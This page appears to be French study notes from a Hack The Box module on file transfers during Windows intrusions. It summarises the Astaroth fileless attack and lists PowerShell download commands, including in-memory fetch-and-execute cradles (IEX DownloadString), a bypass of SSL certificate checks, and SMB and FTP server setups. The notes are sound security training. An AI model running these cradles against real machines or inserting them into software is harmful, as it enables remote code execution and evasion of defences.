---
title: File Transfers
description: 
published: true
date: 2025-03-29T12:39:26.528Z
tags: notes, htb, module
editor: markdown
dateCreated: 2025-03-16T15:21:30.098Z
---

# File Transfers

Date de complétion: XX/XX/XX

# Notes

## Windows File Transfer Methods

### Introduction

Les nouvelles versions de Windows comportent de nombreux outils pour le transfert de fichiers.
Les attaquants utilisent le transfert de fichier pour opérer et éviter de se faire détecter.
Les défenseurs doivent connaitre ces méthodes et leur fonctionnement pour surveiller et créer les politiques correspondantes.

Le post [Microsoft Astaroth Attack](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/) donne un exemple d'APT et des [menaces sans fichier](https://learn.microsoft.com/fr-fr/defender-endpoint/malware/fileless-threats).

Les menaces fileless, n'existent pas sous forme de fichiers mais exploitent des outils légitimes du système pour exécuter des attaques.

L'attaque Astaroth commence par un lien malveillant dans un e-mail de phishing, menant à un fichier LNK.
Celui-ci déclenche l'exécution de [WMIC](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic) avec l'option "/Format" pour télécharger du code JavaScript malveillant.
Ce dernier utilise [Bitsadmin](https://learn.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool) pour récupérer des charges utiles encodées en base64, qui sont ensuite décodées avec Certutil.
Enfin, [Regsvr32](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) charge un DLL permettant d'injecter le malware Astaroth dans le processus Userinit.

Voici les étapes de l'attaque Astaroth:
![fig1a-astaroth-attack-chain.png](/images/fig1a-astaroth-attack-chain.png){.align-center}

Pour plus d'informations sur les fileless threats:
[now-you-see-me-exposing-fileless-malware](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/)

### PowerShell Base64 Encode & Decode

Selon la taille du fichier à transférer, différentes méthodes sans communication réseau peuvent être utilisées.

Avec un terminal, on peut encoder un fichier en base64, copier son contenu, puis le décoder pour retrouver le fichier d'origine.

Il est essentiel de vérifier l'intégrité du fichier avant et après le transfert. Pour cela, on peut utiliser md5sum, qui génère et vérifie des sommes de contrôle MD5 de 128 bits.

Récupérer le hash du fichier

```
md5sum myfile
```

Encoder le fichier en base64

```
cat myfile | base64 -w 0; echo
```

Une fois sur la cible, il est possible d'écrire le contenu décodé dans un fichier

```
[IO.File]::WriteAllBytes("C:\temp\fichier", [Convert]::FromBase64String("<contenu>"))
```

Il est maintenant possible de vérifier que le hash MD5 correspond bien à l'original avec [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2).

```
Get-FileHash C:\temp\fichier -Algorithm md5
```

Cependant un webshell ou l'utilitaire de ligne de commande Windows (cmd.exe) ont des limites en terme de taille de chaîne de caractères.

### PowerShell Web Downloads

Il est possible d'utiliser la classe PowerShell [system.net.webclient](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient) pour télécharger des fichiers avec HTTP/S ou encore FTP.

### File Download

Télécharger un fichier avec les méthodes DownloadFile et DownloadFileAsync:

```
(New-Object Net.WebClient).DownloadFile('<URL>','<fichier de sortie>')
```

```
(New-Object Net.WebClient).DownloadFileAsync('<URL>','<fichier de sortie>')
```

### PowerShell DownloadString - Fileless Method

Au lieu de télécharger un script PowerShell sur le disque, on peut l'exécuter directement en mémoire en utilisant la commande Invoke-Expression.
Éxécuter un fichier (mode fileless) avec [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) et la méthode DownloadString:

```
IEX (New-Object Net.WebClient).DownloadString('<URL>')
```

```
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

### PowerShell Invoke-WebRequest

À partir de PowerShell 3.0, la commande Invoke-WebRequest (alias de curl,iwr,wget) permet de télécharger des fichiers, mais elle est relativement lente.

```
Invoke-WebRequest <URL> -OutFile <fichier>
```

Une petite liste de "cradles" (technique utilisée pour télécharger et exécuter du code malveillant directement en mémoire) est disponible [ici](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

### Common Errors with PowerShell

Parfois Internet Explorer doit être lancé au moins une première fois avant d'exécuter Invoke-WebRequest.
Pour résoudre ce problème il est possible d'utiliser l'option "-UseBasicParsing"

Avec Net.WebClient, pour ne pas vérifier le certificat SSL:

```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### SMB Downloads

Le protocole SMB (Server Message Block) tourne sur le port TCP 445. C'est un protocole commun sur les réseaux composés de services Windows. Il permet entre autres aux applications et utilisateurs de transferer des fichiers vers et depuis des serveurs SMB.


Il est possible d'utiliser [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) de la suite Impacket pour créer un parrtage SMB.

```
impacket-smbserver share -smb2support /tmp/smbshare
```

Il est possible d'utiliser des commandes comme [Copy-item](https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.management/copy-item?view=powershell-7.5), ou [Move-Item](https://learn.microsoft.com/fr-fr/powershell/module/microsoft.powershell.management/move-item?view=powershell-7.5) ou encore [copy](https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/copy) pour intéragir avec le partage. 

```
copy \\<adresse>\<partage>\<fichier>
```

Parfois la politique Windows peut empécher l'accès aux partages ne nécéssitant aucune authentification.
Pour contourner cela il est possible de créer un serveur SMB avec authentification:

```
impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

Pour monter le partage sur un lecteur (parfois obligatoire pour certaines commandes):

```
net use <lettre>: \\<adresse>\<partage> /user:<utilisateur> <nom>
```

### FTP Downloads

Un autre moyen de transferer des fichiers est FTP (File Transfer Protocol), FTP utilise le port TCP 21 et TCP 20.
Il est possible d'utiliser un client FTP ou la classe PowerShell [Net.WebClient](https://learn.microsoft.com/fr-fr/dotnet/api/system.net.webclient?view=net-8.0).

Pour créer un serveur FTP, il est possible d'utiliser le module Python [pyftpdlib](https://pypi.org/project/pyftpdlib/)

Installer pyftpdlib:

```
pip3 install pyftpdlib
```

Démarrer le serveur FTP sur le port 21 (par défaut, le port 2121 est utilisé):

```
python3 -m pyftpdlib --port 21
```